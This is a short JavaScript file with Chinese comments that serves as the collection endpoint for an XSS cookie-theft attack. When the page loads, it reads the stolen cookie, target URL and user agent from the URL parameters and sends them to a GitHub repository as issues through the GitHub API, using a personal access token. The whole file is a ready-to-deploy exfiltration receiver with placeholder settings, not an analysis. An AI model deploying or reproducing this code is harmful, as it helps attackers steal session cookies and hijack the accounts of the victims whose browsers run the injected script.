// ########## 必须修改这3个配置项 ##########
const GITHUB_TOKEN = "你的GitHub Token（ghp_xxxxxx开头）";
const GITHUB_USER = "QWE664-44";
const GITHUB_REPO = "xss-catcher";
// #######################################

// 解析URL中的参数（获取窃取的Cookie/页面信息）
function getUrlParams() {
    const params = {};
    window.location.search.slice(1).split('&').forEach(item => {
        const [key, val] = item.split('=');
        params[key] = decodeURIComponent(val || '');
    });
    return params;
}

// 把信息提交到GitHub Issues
async function createGithubIssue(data) {
    if (!data.cookie && !data.url && !data.user_agent) return;
    // 构造Issue标题和内容
    const title = `XSS数据窃取 - ${new Date().toLocaleString()}`;
    const body = `
### 窃取的XSS数据
- **Cookie**：\`${data.cookie || '无'}\`
- **目标URL**：\`${data.url || '无'}\`
- **用户代理**：\`${data.user_agent || '无'}\`
- **窃取时间**：${new Date().toISOString()}
    `.trim();
    // 调用GitHub API创建Issue
    await fetch(`https://api.github.com/repos/${GITHUB_USER}/${GITHUB_REPO}/issues`, {
        method: 'POST',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ title, body, labels: ['xss-capture'] })
    });
}

// 页面加载时执行：解析参数+提交到GitHub
window.onload = () => {
    const params = getUrlParams();
    createGithubIssue({
        cookie: params.cookie,
        url: params.url,
        user_agent: params.user_agent
    });
};
